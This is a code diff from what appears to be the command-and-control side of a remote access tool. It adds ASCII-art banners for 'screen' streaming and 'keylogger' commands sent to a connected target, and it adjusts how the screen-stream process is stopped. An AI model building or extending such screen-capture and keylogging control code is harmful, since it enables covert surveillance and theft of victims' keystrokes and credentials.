@@ -109,11 +109,28 @@ def target_communication(target):
         elif command == 'screen':
             connected = {'video': False, 'audio': False}
             start_screen_stream(connected)
-            # while not (connected['video'] and connected['audio']):
-            #     print('waiting...')
-            #     import time
-            #     time.sleep(2)
-            
+            print('''
+ _____                            _____ _                            _             
+/  ___|                          /  ___| |                          (_)            
+\ `--.  ___ _ __ ___  ___ _ __   \ `--.| |_ _ __ ___  __ _ _ __ ___  _ _ __   __ _ 
+ `--. \/ __| '__/ _ \/ _ \ '_ \   `--. \ __| '__/ _ \/ _` | '_ ` _ \| | '_ \ / _` |
+/\__/ / (__| | |  __/  __/ | | | /\__/ / |_| | |  __/ (_| | | | | | | | | | | (_| |
+\____/ \___|_|  \___|\___|_| |_| \____/ \__|_|  \___|\__,_|_| |_| |_|_|_| |_|\__, |
+                                                                              __/ |
+                                                                             |___/ 
+''')
+        
+        # Keylogger
+        elif command == 'keylogger':
+            print('''
+  _  __            _  _     _              __ _    __ _                  
+ | |/ /    ___    | || |   | |     ___    / _` |  / _` |   ___      _ _  
+ | ' <    / -_)    \_, |   | |    / _ \   \__, |  \__, |  / -_)    | '_| 
+ |_|\_\   \___|   _|__/   _|_|_   \___/   |___/   |___/   \___|   _|_|_  
+_|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+''')
+        
         # Others
         else:
             result = reliable_recv(target)
@@ -258,15 +275,14 @@ def start_screen_stream(connected):
 # Function to stop screen streaming process
 def stop_screen_stream():
     global screen_process
-    
-    if screen_process and screen_process.is_alive():
-        # Terminate the process
-        screen_process.terminate()
-        screen_process.join(timeout=1)  # Wait for termination
-        print("Screen streaming process terminated.")
-    else:
-        print("Screen streaming process not running.")
-
+    try:
+        if screen_process and screen_process.is_alive():
+            # Terminate the process
+            screen_process.terminate()
+            screen_process.join(timeout=1)  # Wait for termination
+            print("Screen streaming process terminated.")
+    except NameError:
+        print("Screen streaming process not running.")  
 
 def main():
     # Create a socket for the server
